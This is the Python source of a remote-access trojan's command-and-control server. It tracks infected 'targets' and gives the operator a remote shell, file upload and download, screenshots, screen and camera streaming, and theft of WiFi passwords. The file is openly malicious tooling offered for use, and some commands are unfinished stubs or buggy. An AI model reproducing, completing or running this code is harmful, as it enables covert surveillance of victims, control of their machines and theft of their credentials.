import socket
import json
import termcolor
import subprocess
import os
import time
from vidstream import StreamingServer
import threading
from pprint import pprint

#ipaddress = socket.gethostbyname(socket.gethostname())
#ipaddress = "192.168.8.114"
ipaddress = "127.0.0.1"
vids = StreamingServer(ipaddress, 8888)

def make(command):
  execute = subprocess.Popen(command, shell=True,
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

  result = execute.stdout.read() + execute.stderr.read()
  result = result.decode()
  return result

def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            pprint(termcolor.colored(json.loads(data), "green"), indent=4)
        except ValueError:
            continue

def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    # s.close()

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def target_communication(target, ip):
  while True:
    command = input("* shell-%s" % str(ip))
    reliable_send(target,command)
    if command == "background":
      break
    elif command == "quit":
      targets.remove(target)
      ips.remove(ip)
      break
    elif command == " " or command == "":
      continue
    elif command == "clear":
      os.system("clear")
    elif command[:3] == "cd ":
      pass
    elif command == 'advice':
      pass
    elif command[:4] == 'open':
      pass
    elif command[:7] == "upload ":
      upload_file(target, command[8:])
    elif command[:9] == "download ":
      download_file(target, command[10:])
    elif command[:8] == 'message ':
      pass
    elif command == 'screenshare':
      vids.start_server()

    elif command == 'watch':
      vids.start_server()

    elif command[:10] == 'screenshot':
      f = open("screenshot%s/screenshot%d.png" % (str(ip), time.time()), "wb")
      target.settimeout(1)
      chunk = target.recv(1024)
      while chunk:
        f.write(chunk)
        try:
          chunk = target.recv(1024)
        except sock.timeout as e:
          break
      target.settimeout(None)
    elif command[:12] == 'wifipassword':
      file_name = "wifipassword/wifipassword%s.txt" % (str(ip))
      download_file(target, file_name)
    elif command[:8] == 'execute ':
      pass
    elif command == "notepad":
      pass
    elif command == 'cmd':
      pass
    elif command[:4] == 'say ':
      pass
    elif command == 'shutdown':
      pass
    elif command == 'system information':
      pass
    elif command == "help":
      print(termcolor.colored("""
      background                      ==> leave Session with the target
      quit                            ==> Quit Session with the target
      clear                           ==> Clear the screen
      advice                          ==> say random advice to target
      help                            ==> to see this message
      cmd                             ==> to open command prompt on target machine
      notepad                         ==> to open notepad on target machine
      shutdown                        ==> to shutdown target machine
      open *url*                      ==> open browser on target machine
      cd *directory name*             ==> changes directory on target system
      upload *file name*              ==> upload file to the target machine
      download *file name*            ==> download file from the target machine
      message *text message*          ==> send message notification to target machine
      screenshot                      ==> take screenshot from target machine
      screenshare                     ==> screenshare the target machine
      watch                           ==> access the target machine camera
      wifipassword                    ==> steal wifi password from target machine
      execute *command*               ==> execute command without output from target machine
      say *command*                   ==> talk through the target machine speaker.
      system information              ==> target machine system information

      """, "green"))


def accept_connections():
  while True:
    if stop_flag:
      break
    sock.settimeout(1)
    try:
      target, ip = sock.accept()
      targets.append(target)
      ips.append(ip)
      print(termcolor.colored(str(ip) + " has connected!!!", "green"))
    except Exception as e:
      pass

targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ipaddress, 5555))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
print(termcolor.colored("[+] waiting for the Incoming Connections...", "green"))

threads = {}
while True:
  command = input("[**] command & control center: ")
  if command == "targets":
    counter = 0
    for ip in ips:
      print(f"session {counter} --- {ip}")
      counter += 1
  elif command == "clear":
    os.system("clear")
  elif command[:7] == "session":
    try:
      num = int(command[8:])
      tarnum = targets[num]
      tarip = ips[num]
      if not threads.get(num):
        threads[num] = tarip
        threading.Thread(target=reliable_recv, args=(tarnum)).start()
      target_communication(tarnum, tarip)
    except:
      print(termcolor.colored("[-] No session under that ID number", "red"))
  elif command == "exit":
    for target in targets:
      reliable_send(target, "quit")
    sock.close()
    stop_flag = True
    t1.join()
    break
  elif command[:4] == "kill":
    targ = targets[int(command[5:].strip())]
    ip = ips[int(command[5:].strip())]
    reliable_send(targ, "quit")
    targets.remove(targ)
    ips.remove(ip)
  elif command[:7] == "sendall":
    x = len(targets)
    print(x)
    if x:
      i = 0
      try:
        while i < x:
          tarnumber = targets[i]
          print(tarnumber)
          reliable_send(tarnumber, command)
      except:
        print(termcolor.colored("Failed", "red"))
  elif command == " " or command == "":
      continue
  elif command == "started thread":
      pprint(threads, sort_dicts=True)
  elif command == "help":
      print("""
      
      """)
  else:
    print(termcolor.colored("[!!!] command doesnt Exist", "red"))

